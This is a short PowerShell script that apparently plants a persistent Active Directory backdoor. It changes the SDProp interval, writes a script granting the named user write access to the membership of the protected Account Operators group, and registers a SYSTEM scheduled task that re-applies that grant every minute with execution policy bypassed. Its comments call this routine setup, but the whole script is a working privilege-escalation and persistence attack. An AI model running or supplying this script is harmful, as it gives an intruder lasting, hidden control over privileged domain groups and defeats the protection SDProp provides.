#Increase SDProp refresh interval to 2 hours (default is 1 hour)
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'AdminSDProtectFrequency' -Value 7200 -Type DWord

# Minimal scheduled task setup for AD ACE
$task = "Set-ADGroupPermission"
$script = "C:\Scripts\Set-ADACE.ps1"

# Ensure script directory exists
New-Item -ItemType Directory -Path (Split-Path $script) -Force | Out-Null

# Write ACE-setting script
@'
Import-Module ActiveDirectory
$g='S-1-5-32-548';$u='maja.lindgren'
$grp=Get-ADGroup -Identity $g
$a=Get-Acl "AD:\$($grp.DistinguishedName)"
$guid=[guid]"bf9679c0-0de6-11d0-a285-00aa003049e2"
$r=New-Object DirectoryServices.ActiveDirectoryAccessRule(
 (New-Object Security.Principal.NTAccount($u)),
 "WriteProperty","Allow",$guid)
$a.AddAccessRule($r)
Set-Acl "AD:\$($grp.DistinguishedName)" $a
'@ | Set-Content $script -Encoding UTF8 -Force

# Create scheduled task (runs every minute for 30 days)
$act=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -EP Bypass -File `"$script`""
$trg=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask $task -Action $act -Trigger $trg -User "SYSTEM" -RunLevel Highest -Force